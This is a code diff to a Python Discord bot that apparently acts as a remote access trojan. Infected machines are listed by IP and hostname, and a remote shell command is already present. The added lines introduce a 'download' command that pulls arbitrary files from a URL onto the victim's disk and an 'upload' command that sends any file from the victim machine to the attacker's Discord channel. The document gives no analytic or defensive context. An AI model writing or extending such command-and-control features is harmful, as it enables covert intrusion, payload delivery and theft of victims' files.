@@ -33,6 +33,27 @@ async def on_ready():
 async def sessions(ctx):
     await ctx.send(f"``[*] {ip}@{hostname}``")
    
+# download
+@bot.command(name=f"download.{hostname}@{ip}")
+async def download(ctx, arg1, arg2):
+    link = ''.join(arg1)
+    name = ''.join(arg2)
+    
+    url = link
+    r = requests.get(url, allow_redirects=True)
+    open(name, 'wb').write(r.content)
+    
+    if os.path.exists(name):
+        await ctx.send(f"``[+] {ip}@{hostname}: File downloaded``")
+    else:
+        await ctx.send(f"``[-] {ip}@{hostname}: File not downloaded``")
+    
+# upload
+@bot.command(name=f"upload.{hostname}@{ip}")
+async def upload(ctx, arg1):
+    path = ''.join(arg1)
+    await ctx.send(f"``[+] {ip}@{hostname}: File uploaded``",file=discord.File(path))
+    
 # shell
 @bot.command(name=f"shell.{hostname}@{ip}")
 async def shell(ctx, *args):
